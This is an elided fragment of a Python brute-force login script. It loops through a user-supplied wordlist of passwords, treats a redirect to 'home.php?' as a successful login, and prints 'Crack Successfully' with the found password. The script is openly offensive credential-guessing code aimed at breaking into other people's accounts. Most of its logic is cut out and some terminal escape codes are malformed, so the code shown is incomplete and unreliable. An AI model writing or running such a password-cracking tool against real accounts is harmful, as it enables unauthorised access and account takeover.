...
def request():
	...
	print('\n\033[amount Password : ',len(password),'\n')
	...
	for line in password:
		...
		if('home.php?' in r.url or 'free' in r.url):
			...
			print('')
			print('\033[91m]\033[90m Crack Successfully ==> \033[91m[\033[90;1m : ',pw)
			
			
if __name__=='__main__':
	print('\033[92m╭────\033[91m[ \033[97mPut in File Wordlist \033[92m( word.txt ) \033[91;1m]')
